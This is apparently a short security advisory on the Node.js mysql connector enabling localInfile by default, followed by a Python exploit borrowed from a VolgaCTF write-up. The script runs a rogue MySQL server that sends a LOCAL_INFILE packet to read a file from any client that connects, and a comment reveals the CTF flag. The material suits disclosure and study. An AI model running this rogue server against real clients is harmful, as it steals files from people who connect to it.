# Details

`mysql` connector of nodejs by default has `localInfile` [set to true](https://github.com/mysqljs/mysql/blob/dc9c152a87ec51a1f647447268917243d2eab1fd/lib/ConnectionConfig.js#L36), which allows mysql servers to load local files from the client by returning a [`0xFB LOCAL_INFILE packet`](https://mariadb.com/kb/en/packet_local_infile/).

exploit:
```py
#from: https://balsn.tw/ctf_writeup/20180324-volgactf/
#!/usr/bin/env python3
# Python 3.6.4
from pwn import *

server = listen(3306)

server.wait_for_connection()
# Server Greeting
server.send(bytes.fromhex('4a0000000a352e372e32310007000000447601417b4f123700fff7080200ff8115000000000000000000005c121c5e6f7d387a4515755b006d7973716c5f6e61746976655f70617373776f726400'))
# Client login request
print(server.recv())
# Server Response OK
server.send(bytes.fromhex('0700000200000002000000'))
# Client SQL query
print(server.recv())
# Server response with evil
query_ok = bytes.fromhex('0700000200000002000000')
dump_etc_passwd = bytes.fromhex('0a000001fb2f666c61672e747874')
server.send(dump_etc_passwd)

# This contains the flag VolgaCTF{hoz3foh3wah6ohbaiphahg6ooxumu8ieNg7Tonoo}
print(server.recv())
```